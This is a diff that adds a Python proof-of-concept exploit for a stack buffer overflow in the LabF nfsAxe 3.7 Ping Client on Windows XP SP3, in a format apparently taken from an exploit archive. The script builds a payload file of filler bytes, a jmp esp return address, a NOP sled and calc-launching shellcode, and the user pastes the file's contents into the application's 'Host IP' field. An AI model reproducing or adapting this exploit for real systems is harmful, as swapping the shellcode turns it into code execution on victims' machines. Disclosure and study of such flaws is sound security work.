@@ -1,0 +1,36 @@
+#!/usr/bin/python
+# Exploit Title: LabF nfsAxe 3.7 Ping Client - Buffer Overflow (Vanilla)
+# Date: 20-04-2019
+# Exploit Author: Dino Covotsos - Telspace Systems
+# Vendor Homepage: http://www.labf.com/nfsaxe
+# Version: 3.7
+# Software Link : http://www.labf.com/download/nfsaxe.exe
+# Contact: services[@]telspace.co.za
+# Twitter: @telspacesystems (Greets to the Telspace Crew)
+# Tested on: Windows XP SP3 ENG x86
+# CVE: TBC from Mitre
+# PoC:
+# 1.) Generate nfsaxeping.txt, copy the contents to clipboard.
+# 2.) In the application(ping.exe) paste contents of clipboard in to "Host IP" and click ok.
+# 3.) Click Start and calc pops
+#0x775a693b : jmp esp | asciiprint,ascii {PAGE_EXECUTE_READ} [ole32.dll] ASLR: False, Rebase: False, SafeSEH: True, OS: True, v5.1.2600.6435 (C:\WINDOWS\system32\ole32.dll)
+#Special thanks to John Leitch for the Windows XP SP3 EN Calc Shellcode (16 Bytes)
+
+shellcode = ("\x31\xC9"                     
+        "\x51"                            
+        "\x68\x63\x61\x6C\x63"            
+        "\x54"                            
+        "\xB8\xC7\x93\xC2\x77"            
+        "\xFF\xD0")                 
+		
+buffer = "A" * 29 + "\x3b\x69\x5a\x77" + "\x90" * 10 + shellcode + "C" * (220-29-4-10-16)
+
+payload = buffer
+try:
+    f=open("nfsaxeping.txt","w")
+    print "[+] Creating %s bytes ping payload.." %len(payload)
+    f.write(payload)
+    f.close()
+    print "[+] File created!"
+except:
+    print "File cannot be created"
